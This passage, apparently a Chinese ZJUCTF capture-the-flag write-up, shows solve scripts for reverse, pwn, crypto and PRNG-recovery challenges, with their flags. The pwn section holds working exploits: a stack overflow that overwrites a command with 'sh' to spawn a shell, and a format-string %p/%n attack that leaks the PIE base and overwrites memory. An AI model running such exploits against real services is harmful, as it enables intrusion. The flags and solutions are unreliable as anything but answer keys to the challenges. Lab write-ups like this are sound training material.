class="number">46</span>,<span class="number">182</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">1</span>,<span class="number">52</span>,<span class="number">13</span>,<span class="number">92</span>,<span class="number">197</span>,<span class="number">250</span>,<span class="number">225</span>,<span class="number">16</span>,<span class="number">63</span>,<span class="number">142</span>,<span class="number">146</span>,<span class="number">173</span>,<span class="number">217</span>,<span class="number">154</span>,<span class="number">214</span>,<span class="number">223</span>,<span class="number">69</span>,<span class="number">44</span>,],</span><br><span class="line">[<span class="number">82</span>,<span class="number">231</span>,<span class="number">32</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">242</span>,<span class="number">102</span>,<span class="number">128</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">158</span>,<span class="number">176</span>,<span class="number">66</span>,<span class="number">226</span>,<span class="number">81</span>,<span class="number">151</span>,<span class="number">114</span>,<span class="number">72</span>,<span class="number">125</span>,<span class="number">221</span>,<span class="number">207</span>,<span class="number">3</span>,<span class="number">234</span>,<span class="number">239</span>,<span class="number">49</span>,<span class="number">71</span>,<span class="number">101</span>,<span class="number">164</span>,<span class="number">18</span>,<span class="number">244</span>,<span class="number">237</span>,<span class="number">236</span>,]]</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">0x94</span>, <span class="number">0x68</span>, <span class="number">0xc6</span>, <span class="number">0xb4</span>, <span class="number">0x9e</span>, <span class="number">0xdd</span>, <span class="number">0x02</span>, <span class="number">0x38</span>, <span class="number">0x1e</span>, <span class="number">0xe4</span>, <span class="number">0x31</span>, <span class="number">0xa6</span>, <span class="number">0x01</span>, <span class="number">0x6f</span>, <span class="number">0xb2</span>, <span class="number">0xc2</span>, <span class="number">0x6c</span>, <span class="number">0xd7</span>, <span class="number">0x96</span>, <span class="number">0x06</span>, <span class="number">0xf0</span>, <span class="number">0xae</span>, <span class="number">0x49</span>, <span class="number">0x20</span>, <span class="number">0xae</span>, <span class="number">0x26</span>, <span class="number">0x0d</span>, <span class="number">0xf7</span>, <span class="number">0xe0</span>, <span class="number">0x7a</span>, <span class="number">0xc4</span>, <span class="number">0x0c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_mul</span>(<span class="params">m, v</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        d = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">            d += m[i][j] * v[j]</span><br><span class="line">        d %= mod</span><br><span class="line">        res.append(d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">plain = mat_mul(mat, cipher)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> plain)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="who-am-i"><a href="#who-am-i" class="headerlink" title="who_am_i"></a>who_am_i</h3><p>栈溢出，覆盖command为sh即可</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">61234</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">50</span> + <span class="string">b&#x27;sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{n0w_u_know_wh@t_is_staCk_0VerfLow}</p>
<h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>default分支里有格式化字符串漏洞 <code>printf(s);</code>，利用 <code>%p</code> 先泄露一个返回地址，从而算出PIE基址。<br>然后就能算出 <code>success_score</code>、<code>score</code>、<code>game_success</code> 的真实地址。<br>先用 <code>%n</code> 把 <code>score</code> 和 <code>success_score</code> 写成相同的值，再把 <code>game_success</code> 写成非零，让主循环退出并走到 <code>if (score == success_score)</code> 分支即可。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61234</span>)</span><br><span class="line"></span><br><span class="line">off=<span class="number">14</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;kkkkkkkk&#x27;</span>+<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie = p.recv(<span class="number">12</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(pie,<span class="number">16</span>)-<span class="number">0x318e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pie base is &#x27;</span>,<span class="built_in">hex</span>(pie_base))</span><br><span class="line">score = pie_base+<span class="number">0x503c</span></span><br><span class="line">target_score  = pie_base+<span class="number">0x5010</span></span><br><span class="line">p.send(<span class="string">b&#x27;%15$nkkk&#x27;</span>+p64(score))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%15$nkkk&#x27;</span>+p64(target_score))</span><br><span class="line">game_success=pie_base+<span class="number">0x5044</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%15$nkkk&#x27;</span>+p64(game_success))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypt-it"><a href="#crypt-it" class="headerlink" title="crypt-it"></a>crypt-it</h3><p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private_key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key_data = f.read()</span><br><span class="line">key = RSA.import_key(key_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct = f.read()</span><br><span class="line"></span><br><span class="line">cipher = PKCS1_OAEP.new(key)</span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pt)</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{RSA_encrypt_with_OAEP_is_secure!}</p>
<h3 id="prng"><a href="#prng" class="headerlink" title="prng"></a>prng</h3><p>AI帮忙做的</p>
<ul>
<li>题目里的“PRNG_PLUS_1”基于四元数乘法：<code>b = a^n</code>，每次 <code>b = b * a</code> 并输出第三分量 <code>b[2]</code>。</li>
<li>对任意固定四元数 (a&#x3D;(w, x, y, z))，都有<strong>二阶</strong>递推：<br>$$a^{k+2} &#x3D; 2w \cdot a^{k+1} - \lVert a\rVert^2 \cdot a^k$$<br>其中 $\lVert a\rVert^2 &#x3D; w^2+x^2+y^2+z^2$（在模 $p$ 意义下）。<br>把任意分量抽出来（例如第三分量），同样满足<br>$$s_{k+2} \equiv cs_{k+1} - ds_k \pmod p, c&#x3D;2w, d&#x3D;\lVert a\rVert^2$$</li>
<li>服务端会先给出前 6 项输出 $s_0,\ldots,s_5$。<br>对任意 $k$，令<br>$$A_k &#x3D; s_{k+3}s_{k+1}-s_{k+2}^2,B_k &#x3D; s_{k}s_{k+2}-s_{k+1}^2.$$<br>由递推可得 $A_k \equiv d\cdot B_k \pmod p$。<br>因而对于两个不同的 $k,\ell$：<br>$$A_k B_\ell - A_\ell B_k \equiv 0 \pmod p$$<br>把若干这样的差取 gcd 可直接恢复出模数 $p$（通常就是 $p$，若是倍数取最大素因子即可）。</li>
<li>有了 $p$ 后，取某个 $k$ 计算 $d \equiv A_k \cdot B_k^{-1} \pmod p$，再由<br>$$c \equiv (s_2 + d s_0) \cdot s_1^{-1} \pmod p$$<br>得到 $c$。随后用二阶递推生成 20 项，拼接字符串做 sha256 校验（与服务端给的 <code>hint</code> 对比）确保无误。</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, itertools, ast, math, random, sys, string</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">10</span>**<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">61234</span></span><br><span class="line"></span><br><span class="line">ALPHABET = (string.ascii_letters + string.digits).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- math helpers ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (a, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    g, x, y = egcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> (g, y, x - (a // b) * y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mod</span>(<span class="params">a, m</span>):</span><br><span class="line">    a %= m</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ZeroDivisionError(<span class="string">&quot;no inverse&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_probable_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    small = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> small:</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n == p</span><br><span class="line">    d, s = n - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> d % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s += <span class="number">1</span>; d //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">325</span>, <span class="number">9375</span>, <span class="number">28178</span>, <span class="number">450775</span>, <span class="number">9780504</span>, <span class="number">1795265022</span>]:</span><br><span class="line">        a %= n</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x = <span class="built_in">pow</span>(a, d, n)</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> (<span class="number">1</span>, n-<span class="number">1</span>): </span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(s-<span class="number">1</span>):</span><br><span class="line">            x = (x * x) % n</span><br><span class="line">            <span class="keyword">if</span> x == n-<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard_rho</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = random.randrange(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line">        f = <span class="keyword">lambda</span> x: (x*x + c) % n</span><br><span class="line">        x = y = <span class="number">2</span></span><br><span class="line">        d = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> d == <span class="number">1</span>:</span><br><span class="line">            x = f(x)</span><br><span class="line">            y = f(f(y))</span><br><span class="line">            d = math.gcd(<span class="built_in">abs</span>(x-y), n)</span><br><span class="line">        <span class="keyword">if</span> d != n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n, res=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>: res = []</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">if</span> is_probable_prime(n):</span><br><span class="line">        res.append(n); <span class="keyword">return</span> res</span><br><span class="line">    d = pollard_rho(n)</span><br><span class="line">    factor(d, res); factor(n//d, res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- recover p &amp; recurrence ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_p_from_seq</span>(<span class="params">seq6</span>):</span><br><span class="line">    s = seq6</span><br><span class="line">    A, B = [], []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        A.append(s[k+<span class="number">3</span>]*s[k+<span class="number">1</span>] - s[k+<span class="number">2</span>]*s[k+<span class="number">2</span>])</span><br><span class="line">        B.append(s[k]*s[k+<span class="number">2</span>]   - s[k+<span class="number">1</span>]*s[k+<span class="number">1</span>])</span><br><span class="line">    vals, G = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">            vals.append(<span class="built_in">abs</span>(A[i]*B[j] - A[j]*B[i]))</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">        G = math.gcd(G, v)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(G)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_cd</span>(<span class="params">seq, p</span>):</span><br><span class="line">    s0, s1, s2, s3 = seq[<span class="number">0</span>], seq[<span class="number">1</span>], seq[<span class="number">2</span>], seq[<span class="number">3</span>]</span><br><span class="line">    A0 = (s3*s1 - s2*s2) % p</span><br><span class="line">    B0 = (s0*s2 - s1*s1) % p</span><br><span class="line">    d = (A0 * inv_mod(B0, p)) % p            <span class="comment"># d = ||a||^2</span></span><br><span class="line">    c = ((s2 + d*s0) % p) * inv_mod(s1 % p, p) % p   <span class="comment"># c = 2w</span></span><br><span class="line">    <span class="keyword">return</span> c, d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_full</span>(<span class="params">c, d, seq6, p, total=<span class="number">20</span></span>):</span><br><span class="line">    out = seq6[:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(out) &lt; total:</span><br><span class="line">        out.append((c*out[-<span class="number">1</span>] - d*out[-<span class="number">2</span>]) % p)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_seq</span>(<span class="params">seq</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, seq)).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- PoW ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">suffix_bytes, digest_hex</span>):</span><br><span class="line">    target = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    <span class="keyword">for</span> i0 <span class="keyword">in</span> ALPHABET:</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">for</span> i2 <span class="keyword">in</span> ALPHABET:</span><br><span class="line">                <span class="keyword">for</span> i3 <span class="keyword">in</span> ALPHABET:</span><br><span class="line">                    pref = <span class="built_in">bytes</span>([i0,i1,i2,i3])</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256(pref + suffix_bytes).digest() == target:</span><br><span class="line">                        <span class="keyword">return</span> pref.decode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- main exploit ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_line_text</span>(<span class="params">io, timeout=<span class="number">2</span></span>):</span><br><span class="line">    line = io.recvline(timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> line.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    first = read_line_text(io, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">assert</span> first.startswith(<span class="string">&#x27;sha256(XXXX + &#x27;</span>)</span><br><span class="line">    tmp = first.split(<span class="string">&#x27;sha256(XXXX + &#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    suffix = tmp.split(<span class="string">&#x27;) ==&#x27;</span>,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    digest = tmp.split(<span class="string">&#x27;) ==&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">    xxxx = solve_pow(suffix.encode(), digest)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> xxxx:</span><br><span class="line">        log.failure(<span class="string">&#x27;PoW failed&#x27;</span>); <span class="keyword">return</span></span><br><span class="line">    log.success(<span class="string">f&#x27;XXXX = <span class="subst">&#123;xxxx&#125;</span>&#x27;</span>)</span><br><span class="line">    io.sendline(xxxx.encode())</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Level:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    known_line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        s = read_line_text(io, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> s.startswith(<span class="string">&#x27;[&#x27;</span>) <span class="keyword">and</span> s.endswith(<span class="string">&#x27;]&#x27;</span>):</span><br><span class="line">            known_line = s</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> known_line:</span><br><span class="line">        log.failure(<span class="string">&#x27;Failed to read known list&#x27;</span>); <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    hint = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        s = read_line_text(io, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">64</span> <span class="keyword">and</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s):</span><br><span class="line">            hint = s</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hint:</span><br><span class="line">        log.failure(<span class="string">&#x27;Failed to read hint&#x27;</span>); <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    seq6 = ast.literal_eval(known_line)</span><br><span class="line">    seq6 = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> seq6]</span><br><span class="line"></span><br><span class="line">    G = recover_p_from_seq(seq6)</span><br><span class="line">    <span class="keyword">if</span> G == <span class="number">0</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;GCD=0&#x27;</span>); <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">if</span> is_probable_prime(G):</span><br><span class="line">        candidates = [G]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        facs = <span class="built_in">sorted</span>(<span class="built_in">set</span>(factor(G)), reverse=<span class="literal">True</span>)</span><br><span class="line">        candidates = facs + [G]</span><br><span class="line"></span><br><span class="line">    chosen = <span class="literal">None</span></span><br><span class="line">    full = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c, d = compute_cd(seq6, p)</span><br><span class="line">            seq20 = gen_full(c, d, seq6, p, <span class="number">20</span>)</span><br><span class="line">            <span class="keyword">if</span> hash_seq(seq20) == hint:</span><br><span class="line">                chosen = (p, c, d)</span><br><span class="line">                full = seq20</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> chosen <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;Could not determine modulus p by hint 